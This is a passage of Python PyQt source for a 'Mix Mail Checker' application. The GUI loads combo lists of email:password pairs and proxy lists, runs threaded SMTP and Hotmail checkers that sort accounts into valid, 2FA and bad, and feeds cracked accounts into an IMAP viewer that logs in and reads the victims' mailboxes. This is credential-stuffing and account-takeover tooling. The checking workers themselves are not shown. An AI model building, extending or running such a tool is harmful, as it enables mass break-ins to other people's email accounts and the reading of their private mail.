            self.smtp_worker.signals.progress.connect(self.smtp_update_progress)
            self.smtp_worker.signals.result.connect(self.smtp_add_result)
            self.smtp_worker.signals.log.connect(self.smtp_add_log)
            self.smtp_worker.signals.finished.connect(self.smtp_finished)
            self.smtp_worker.signals.cpm.connect(self.update_cpm)

            self.smtp_worker_thread.started.connect(self.smtp_worker.run)
            self.smtp_worker_thread.start()

        def smtp_pause(self):
            if self.smtp_worker:
                self.smtp_worker.toggle_pause()
                self.smtp_btn_pause.setText("▶ Resume" if self.smtp_worker.is_paused else "⏸ Pause")

        def smtp_stop(self):
            if self.smtp_worker:
                self.smtp_worker.stop()
            self.smtp_is_running = False
            self.smtp_btn_start.setEnabled(True)
            self.smtp_btn_pause.setEnabled(False)
            self.smtp_btn_stop.setEnabled(False)
            self.smtp_btn_load.setEnabled(True)

        def smtp_update_progress(self, checked, valid, invalid):
            self.smtp_progress.setValue(checked)
            self.smtp_stats['checked'].setText(str(checked))
            self.smtp_stats['valid'].setText(str(valid))
            self.smtp_stats['invalid'].setText(str(invalid))

        def smtp_add_result(self, result_type, combo, details):
            if result_type == "valid":
                table = self.smtp_table_valid
                color = QColor("lime")
                tab_idx = 0
                tab_name = "Valid"
            else:
                table = self.smtp_table_invalid
                color = QColor("red")
                tab_idx = 1
                tab_name = "Invalid"

            row = table.rowCount()
            table.insertRow(row)
            item1 = QTableWidgetItem(combo)
            item2 = QTableWidgetItem(details)
            item1.setForeground(QBrush(color))
            item2.setForeground(QBrush(color))
            table.setItem(row, 0, item1)
            table.setItem(row, 1, item2)
            self.smtp_results_tabs.setTabText(tab_idx, f"{tab_name} ({row + 1})")

        def smtp_add_log(self, message, color):
            self.smtp_log.moveCursor(QTextCursor.MoveOperation.End)
            self.smtp_log.setTextColor(color)
            self.smtp_log.insertPlainText(f"{datetime.now().strftime('%H:%M:%S')} - {message}\n")
            self.smtp_log.moveCursor(QTextCursor.MoveOperation.End)

        def smtp_finished(self, stats, elapsed, cpm):
            self.smtp_is_running = False
            self.smtp_btn_start.setEnabled(True)
            self.smtp_btn_pause.setEnabled(False)
            self.smtp_btn_stop.setEnabled(False)
            self.smtp_btn_load.setEnabled(True)
            self.status_label.setText("SMTP Checker finished!")

        # ============ HOTMAIL CHECKER TAB ============
        def init_hotmail_tab(self):
            layout = QVBoxLayout(self.hotmail_tab)

            top_layout = QHBoxLayout()
            self.hotmail_btn_load = QPushButton("📂 Load Combos")
            self.hotmail_btn_load_proxies = QPushButton("🌐 Load Proxies")
            self.hotmail_btn_start = QPushButton("▶ Start")
            self.hotmail_btn_pause = QPushButton("⏸ Pause")
            self.hotmail_btn_stop = QPushButton("⏹ Stop")
            self.hotmail_btn_stop.setEnabled(False)
            self.hotmail_btn_pause.setEnabled(False)
            
            top_layout.addWidget(self.hotmail_btn_load)
            top_layout.addWidget(self.hotmail_btn_load_proxies)
            top_layout.addStretch()
            top_layout.addWidget(self.hotmail_btn_start)
            top_layout.addWidget(self.hotmail_btn_pause)
            top_layout.addWidget(self.hotmail_btn_stop)
            layout.addLayout(top_layout)

            stats_layout = QHBoxLayout()
            stats_group = QGroupBox("Hotmail Statistics")
            stats_grid = QHBoxLayout(stats_group)
            self.hotmail_stats = {}
            for name in ["Checked", "Valid", "Inbox", "2FA", "Bad", "Combos"]:
                box = QVBoxLayout()
                lbl_name = QLabel(name)
                lbl_name.setAlignment(Qt.AlignmentFlag.AlignCenter)
                lbl_val = QLabel("0")
                lbl_val.setAlignment(Qt.AlignmentFlag.AlignCenter)
                lbl_val.setFont(QFont("Arial", 14, QFont.Weight.Bold))
                lbl_val.setStyleSheet("color: #aaffff;")
                box.addWidget(lbl_name)
                box.addWidget(lbl_val)
                stats_grid.addLayout(box)
                self.hotmail_stats[name.lower().replace(" ", "_")] = lbl_val
            layout.addWidget(stats_group)

            self.hotmail_progress = QProgressBar()
            layout.addWidget(self.hotmail_progress)

            self.hotmail_results_tabs = QTabWidget()
            self.hotmail_table_valid = self.create_table(["Combo", "Details"])
            self.hotmail_table_2fa = self.create_table(["Combo", "Details"])
            self.hotmail_table_bad = self.create_table(["Combo", "Reason"])
            self.hotmail_log = QTextEdit()
            self.hotmail_log.setReadOnly(True)
            
            self.hotmail_results_tabs.addTab(self.hotmail_table_valid, "Valid (0)")
            self.hotmail_results_tabs.addTab(self.hotmail_table_2fa, "2FA (0)")
            self.hotmail_results_tabs.addTab(self.hotmail_table_bad, "Bad (0)")
            self.hotmail_results_tabs.addTab(self.hotmail_log, "Log")
            layout.addWidget(self.hotmail_results_tabs)

            self.hotmail_btn_load.clicked.connect(self.hotmail_load_combos)
            self.hotmail_btn_load_proxies.clicked.connect(self.hotmail_load_proxies)
            self.hotmail_btn_start.clicked.connect(self.hotmail_start)
            self.hotmail_btn_pause.clicked.connect(self.hotmail_pause)
            self.hotmail_btn_stop.clicked.connect(self.hotmail_stop)

        def hotmail_load_combos(self):
            file_path, _ = QFileDialog.getOpenFileName(self, "Open Combo List", "", "Text Files (*.txt)")
            if file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        self.hotmail_combos = [line.strip() for line in f if line.strip() and ':' in line]
                    self.hotmail_stats['combos'].setText(str(len(self.hotmail_combos)))
                    self.hotmail_progress.setMaximum(len(self.hotmail_combos))
                    self.status_label.setText(f"Loaded {len(self.hotmail_combos)} combos for Hotmail")
                except Exception as e:
                    QMessageBox.critical(self, "Error", f"Failed to load: {e}")

        def hotmail_load_proxies(self):
            file_path, _ = QFileDialog.getOpenFileName(self, "Open Proxy List", "", "Text Files (*.txt)")
            if file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        self.hotmail_proxies = [line.strip() for line in f if line.strip()]
                    self.status_label.setText(f"Loaded {len(self.hotmail_proxies)} proxies")
                except Exception as e:
                    QMessageBox.critical(self, "Error", f"Failed to load: {e}")

        def hotmail_start(self):
            if not hasattr(self, 'hotmail_combos') or not self.hotmail_combos:
                QMessageBox.warning(self, "Warning", "Load combos first!")
                return

            self.hotmail_is_running = True
            self.hotmail_btn_start.setEnabled(False)
            self.hotmail_btn_pause.setEnabled(True)
            self.hotmail_btn_stop.setEnabled(True)
            self.hotmail_btn_load.setEnabled(False)
            self.hotmail_btn_load_proxies.setEnabled(False)

            settings = {
                "threads": self.settings.value("threads", 50, type=int),
                "timeout": self.settings.value("timeout", 10, type=int),
            }

            self.hotmail_worker = HotmailCheckerWorker(settings)
            for combo in self.hotmail_combos:
                self.hotmail_worker.combo_queue.put(combo)
            if hasattr(self, 'hotmail_proxies'):
                for proxy in self.hotmail_proxies:
                    self.hotmail_worker.proxy_queue.put(proxy)

            self.hotmail_worker_thread = QThread()
            self.hotmail_worker.moveToThread(self.hotmail_worker_thread)

            self.hotmail_worker.signals.progress.connect(self.hotmail_update_progress)
            self.hotmail_worker.signals.result.connect(self.hotmail_add_result)
            self.hotmail_worker.signals.log.connect(self.hotmail_add_log)
            self.hotmail_worker.signals.finished.connect(self.hotmail_finished)
            self.hotmail_worker.signals.cpm.connect(self.update_cpm)

            self.hotmail_worker_thread.started.connect(self.hotmail_worker.run)
            self.hotmail_worker_thread.start()

        def hotmail_pause(self):
            if self.hotmail_worker:
                self.hotmail_worker.toggle_pause()
                self.hotmail_btn_pause.setText("▶ Resume" if self.hotmail_worker.is_paused else "⏸ Pause")

        def hotmail_stop(self):
            if self.hotmail_worker:
                self.hotmail_worker.stop()
            self.hotmail_is_running = False
            self.hotmail_btn_start.setEnabled(True)
            self.hotmail_btn_pause.setEnabled(False)
            self.hotmail_btn_stop.setEnabled(False)
            self.hotmail_btn_load.setEnabled(True)
            self.hotmail_btn_load_proxies.setEnabled(True)

        def hotmail_update_progress(self, checked, valid, inbox, bad, twofa):
            self.hotmail_progress.setValue(checked)
            self.hotmail_stats['checked'].setText(str(checked))
            self.hotmail_stats['valid'].setText(str(valid))
            self.hotmail_stats['inbox'].setText(str(inbox))
            self.hotmail_stats['bad'].setText(str(bad))
            self.hotmail_stats['2fa'].setText(str(twofa))

        def hotmail_add_result(self, result_type, combo, details):
            if result_type == "valid":
                table = self.hotmail_table_valid
                color = QColor("lime")
                tab_idx = 0
                tab_name = "Valid"
            elif result_type == "2fa":
                table = self.hotmail_table_2fa
                color = QColor("yellow")
                tab_idx = 1
                tab_name = "2FA"
            else:
                table = self.hotmail_table_bad
                color = QColor("red")
                tab_idx = 2
                tab_name = "Bad"

            row = table.rowCount()
            table.insertRow(row)
            item1 = QTableWidgetItem(combo)
            item2 = QTableWidgetItem(details)
            item1.setForeground(QBrush(color))
            item2.setForeground(QBrush(color))
            table.setItem(row, 0, item1)
            table.setItem(row, 1, item2)
            self.hotmail_results_tabs.setTabText(tab_idx, f"{tab_name} ({row + 1})")

        def hotmail_add_log(self, message, color):
            self.hotmail_log.moveCursor(QTextCursor.MoveOperation.End)
            self.hotmail_log.setTextColor(color)
            self.hotmail_log.insertPlainText(f"{datetime.now().strftime('%H:%M:%S')} - {message}\n")
            self.hotmail_log.moveCursor(QTextCursor.MoveOperation.End)

        def hotmail_finished(self, stats, elapsed, cpm):
            self.hotmail_is_running = False
            self.hotmail_btn_start.setEnabled(True)
            self.hotmail_btn_pause.setEnabled(False)
            self.hotmail_btn_stop.setEnabled(False)
            self.hotmail_btn_load.setEnabled(True)
            self.hotmail_btn_load_proxies.setEnabled(True)
            self.status_label.setText("Hotmail Checker finished!")

        # ============ IMAP VIEWER TAB ============
        def init_imap_viewer_tab(self):
            layout = QVBoxLayout(self.imap_viewer_tab)

            login_group = QGroupBox("IMAP Account Login")
            login_layout = QHBoxLayout(login_group)
            self.imap_viewer_email = QLineEdit()
            self.imap_viewer_email.setPlaceholderText("Email Address")
            self.imap_viewer_password = QLineEdit()
            self.imap_viewer_password.setPlaceholderText("Password")
            self.imap_viewer_password.setEchoMode(QLineEdit.EchoMode.Password)
            self.imap_viewer_server = QLineEdit()
            self.imap_viewer_server.setPlaceholderText("IMAP Server (auto-detect)")
            self.imap_viewer_connect_btn = QPushButton("Connect")
            self.imap_viewer_disconnect_btn = QPushButton("Disconnect")
            self.imap_viewer_disconnect_btn.setEnabled(False)
            login_layout.addWidget(self.imap_viewer_email)
            login_layout.addWidget(self.imap_viewer_password)
            login_layout.addWidget(self.imap_viewer_server)
            login_layout.addWidget(self.imap_viewer_connect_btn)
            login_layout.addWidget(self.imap_viewer_disconnect_btn)
            layout.addWidget(login_group)
            self.imap_viewer_email.textChanged.connect(self.autodetect_viewer_server)

            splitter = QSplitter(Qt.Orientation.Horizontal)
            layout.addWidget(splitter)

            self.viewer_mailbox_list = QListWidget()
            splitter.addWidget(self.viewer_mailbox_list)

            email_panel_widget = QWidget()
            email_panel_layout = QVBoxLayout(email_panel_widget)
            email_panel_layout.setContentsMargins(0,0,0,0)

            search_box = QHBoxLayout()
            self.viewer_search_input = QLineEdit()
            self.viewer_search_input.setPlaceholderText("Search in current mailbox...")
            self.viewer_search_btn = QPushButton("Search")
            search_box.addWidget(self.viewer_search_input)
            search_box.addWidget(self.viewer_search_btn)
            email_panel_layout.addLayout(search_box)
            
            email_view_splitter = QSplitter(Qt.Orientation.Vertical)
            self.viewer_email_list = QListWidget()
            email_view_splitter.addWidget(self.viewer_email_list)
            
            self.viewer_email_tabs = QTabWidget()
            self.viewer_email_body = QTextEdit()
            self.viewer_email_body.setReadOnly(True)
            self.viewer_email_headers = QTextEdit()
            self.viewer_email_headers.setReadOnly(True)
            self.viewer_email_tabs.addTab(self.viewer_email_body, "Body")
            self.viewer_email_tabs.addTab(self.viewer_email_headers, "Headers")
            email_view_splitter.addWidget(self.viewer_email_tabs)
            
            email_view_splitter.setSizes([200, 400])
            email_panel_layout.addWidget(email_view_splitter)
            splitter.addWidget(email_panel_widget)
            splitter.setSizes([200, 500])

            self.imap_viewer_connect_btn.clicked.connect(self.connect_viewer)
            self.imap_viewer_disconnect_btn.clicked.connect(self.disconnect_viewer)
            self.viewer_mailbox_list.currentItemChanged.connect(self.on_viewer_mailbox_selected)
            self.viewer_email_list.currentItemChanged.connect(self.on_viewer_email_selected)
            self.viewer_search_btn.clicked.connect(self.search_in_viewer)

        def autodetect_viewer_server(self, text):
            try:
                domain = text.split('@')[1]
                server, port = self.get_imap_server_from_domain(domain)
                self.imap_viewer_server.setText(server)
            except IndexError:
                self.imap_viewer_server.clear()

        def connect_viewer(self):
            email = self.imap_viewer_email.text()
            password = self.imap_viewer_password.text()
            server = self.imap_viewer_server.text()
            if not all([email, password, server]):
                QMessageBox.warning(self, "IMAP Viewer", "Please fill in all fields.")
                return
            self.disconnect_viewer()
            self.imap_viewer_connect_btn.setEnabled(False)
            self.imap_viewer_disconnect_btn.setEnabled(True)
            self.status_label.setText(f"Connecting to {server}...")

            self.imap_client = IMAPClient(email, password, server)
            self.imap_thread = QThread()
            self.imap_client.moveToThread(self.imap_thread)

            self.imap_client.signals.error.connect(self.on_viewer_error)
            self.imap_client.signals.mailboxes_loaded.connect(self.on_viewer_mailboxes_loaded)
            self.imap_client.signals.emails_loaded.connect(self.on_viewer_emails_loaded)
            self.imap_client.signals.email_content_loaded.connect(self.on_viewer_email_content_loaded)
            self.imap_client.signals.connection_success.connect(self.on_viewer_connection_success)

            self.imap_thread.started.connect(self.run_viewer_connect)
            self.imap_thread.start()

        def disconnect_viewer(self):
            if self.imap_thread and self.imap_thread.isRunning():
                if self.imap_client:
                    self.imap_client.disconnect()
                self.imap_thread.quit()
                self.imap_thread.wait(2000)
            self.viewer_mailbox_list.clear()
            self.viewer_email_list.clear()
            self.viewer_email_body.clear()
            self.viewer_email_headers.clear()
            self.imap_viewer_connect_btn.setEnabled(True)
            self.imap_viewer_disconnect_btn.setEnabled(False)
            self.status_label.setText("Disconnected from IMAP server.")

        def run_viewer_connect(self):
            if self.imap_client.connect():
                self.imap_client.list_mailboxes()

        def on_viewer_connection_success(self):
            self.status_label.setText("Connected successfully!")

        def on_viewer_error(self, error_msg):
            self.status_label.setText(f"Error: {error_msg}")
            self.imap_viewer_connect_btn.setEnabled(True)
            self.imap_viewer_disconnect_btn.setEnabled(False)

        def on_viewer_mailboxes_loaded(self, mailboxes):
            self.status_label.setText("Connected. Select a mailbox.")
            self.viewer_mailbox_list.clear()
            self.viewer_mailbox_list.addItems(mailboxes)

        def on_viewer_mailbox_selected(self, current_item):
            if not current_item or not self.imap_client:
                return
            self.search_in_viewer()

        def search_in_viewer(self):
            current_item = self.viewer_mailbox_list.currentItem()
            if not current_item or not self.imap_client:
                QMessageBox.warning(self, "IMAP Viewer", "Please select a mailbox first.")
                return
            mailbox = current_item.text()
            search_term = self.viewer_search_input.text()
            self.status_label.setText(f"Searching in {mailbox}...")
            self.viewer_email_list.clear()
            self.viewer_email_body.clear()
            self.viewer_email_headers.clear()
            self.imap_client.fetch_emails(mailbox, search_term, 50)

        def on_viewer_emails_loaded(self, emails):
            self.status_label.setText(f"Loaded {len(emails)} emails.")
            self.viewer_email_list.clear()
            for email_data in emails:
                item = QListWidgetItem(f"From: {email_data['from'][:30]}...\nSubject: {email_data['subject'][:40]}...")
                item.setData(Qt.ItemDataRole.UserRole, email_data['uid'])
                self.viewer_email_list.addItem(item)

        def on_viewer_email_selected(self, current_item):
            if not current_item or not self.imap_client:
                return
            uid = current_item.data(Qt.ItemDataRole.UserRole)
            self.status_label.setText("Fetching content...")
            self.viewer_email_body.clear()
            self.viewer_email_headers.clear()
            self.imap_client.fetch_email_content(uid)

        def on_viewer_email_content_loaded(self, content):
            self.status_label.setText("Email content loaded.")
            self.viewer_email_body.setText(content['body'])
            self.viewer_email_headers.setText(content['headers'])

        # ============ COMMON FUNCTIONS ============
        def update_cpm(self, cpm):
            self.cpm_label.setText(f"CPM: {cpm}")

        def open_settings(self):
            dialog = SettingsDialog(self.settings, self)
            if dialog.exec():
                theme_name = self.settings.value("theme", "dark")
                self.apply_theme(theme_name)

        def show_table_context_menu(self, table, position):
            menu = QMenu()
            copy_action = menu.addAction("📋 Copy Selected Rows")
            
            if table == self.imap_table_hits:
                menu.addSeparator()
                load_to_viewer = menu.addAction("📧 Load to IMAP Viewer")
            
            action = menu.exec(table.mapToGlobal(position))
            
            if action == copy_action:
                self.copy_table_selection(table)
            elif table == self.imap_table_hits and 'load_to_viewer' in locals() and action == load_to_viewer:
                self.load_to_imap_viewer(table)

        def load_to_imap_viewer(self, table):
            selection = table.selectionModel().selectedRows()
            if not selection:
                QMessageBox.warning(self, "Warning", "Select a row first!")
                return
            
            row = selection[0].row()
            combo_item = table.item(row, 0)
            if not combo_item:
                return
            
            combo = combo_item.text()
            try:
                if ':' in combo:
                    email, password = combo.split(':', 1)
                    domain = email.split('@')[1]
                    server, port = self.get_imap_server_from_domain(domain)
                    
                    for i in range(self.main_tabs.count()):
                        if self.main_tabs.tabText(i) == "🔍 IMAP Viewer":
                            self.main_tabs.setCurrentIndex(i)
                            break
                    
                    self.imap_viewer_email.setText(email)
                    self.imap_viewer_password.setText(password)
                    self.imap_viewer_server.setText(server)
                    
                    self.connect_viewer()
                    self.status_label.setText(f"Loaded {email} to IMAP Viewer")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load: {str(e)}")

        def copy_table_selection(self, table):
            selection = table.selectionModel().selectedRows()
            if not selection:
                return
            clipboard_text = ""
            for index in sorted(selection):
                row_text = [table.item(index.row(), col).text() for col in range(table.columnCount())]
                clipboard_text += "\t".join(row_text) + "\n"
            QApplication.clipboard().setText(clipboard_text)

        def clear_all_results(self):
            reply = QMessageBox.question(self, "Confirm", "Clear all results?",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                for table in [self.imap_table_hits, self.imap_table_bad, self.imap_table_intel,
                             self.smtp_table_valid, self.smtp_table_invalid,
                             self.hotmail_table_valid, self.hotmail_table_2fa, self.hotmail_table_bad]:
                    table.setRowCount(0)
                self.imap_log.clear()
                self.smtp_log.clear()
                self.hotmail_log.clear()
                self.status_label.setText("Cleared all results")

        def closeEvent(self, event):
            self.disconnect_viewer()
            if self.imap_is_running or self.smtp_is_running or self.hotmail_is_running:
                reply = QMessageBox.question(self, "Exit", "Checker is running. Exit?",
                                             QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
                if reply == QMessageBox.StandardButton.Yes:
                    if self.imap_is_running:
                        self.imap_stop()
                    if self.smtp_is_running:
                        self.smtp_stop()
                    if self.hotmail_is_running:
                        self.hotmail_stop()
                    event.accept()
                else:
                    event.ignore()
            else:
                event.accept()

    if __name__ == '__main__':
        try:
            app = QApplication(sys.argv)
            app.setApplicationName("Mix Mail Checker")
            app.setOrganizationName("Mix Mail Checker")
            main_win = MainWindow()
            main_win.show()
            sys.exit(app.exec())
        except KeyboardInterrupt:
            print("Program interrupted by user.")
            sys.exit(1)
